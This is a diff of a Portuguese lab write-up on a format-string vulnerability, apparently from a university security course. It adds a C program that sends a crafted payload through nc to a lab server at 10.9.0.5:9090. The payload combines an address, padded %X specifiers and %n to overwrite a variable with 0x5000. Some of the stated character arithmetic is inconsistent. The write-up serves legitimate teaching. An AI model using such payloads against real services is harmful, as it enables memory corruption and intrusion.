@@ -110,14 +110,23 @@ O output do lado do servidor foi o seguinte:
 
 ### Task 3.B
 
-Desta vez o valor de `target` deve ser mudado para um valor concreto: 0x5000, ou seja 20480 em decimal. Como sabemos que '%n' irá escrever o número de caracteres escritos até ali, então o input até '%n' terá de ter 20408 caracteres. Como o input é grande, usamos a notação `%.Nx`, com N = 20408 - 4 - 63.
+Desta vez o valor de `target` deve ser mudado para um valor concreto: 0x5000, ou seja 20480 em decimal. Como sabemos que '%n' irá escrever o número de caracteres escritos até ali, então o input até '%n' terá de ter 20408 caracteres. Como o input é grande, usamos a notação `%.NX`, com N = 20408 - 4 - 63*8 = 19980. 
 
 ```c
-#TODO
+#include <string.h>
+#include <stdlib.h>
+
+int main() {
+    char cmd[] = "echo \x68\x50\x0e\x08%.19980X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%n | nc 10.9.0.5 9090";
+
+    system(cmd);
+    return 0;
+}
 ```
 
 Originou o seguinte output no servidor:
 
-#TODO -> print ou texto
+![Task 3 B 1](../img/lab6task3b1.png)
+![Task 3 B 2](../img/lab6task3b2.png)
 
 Como observado, o valor de `target` é agora 0x00005000.
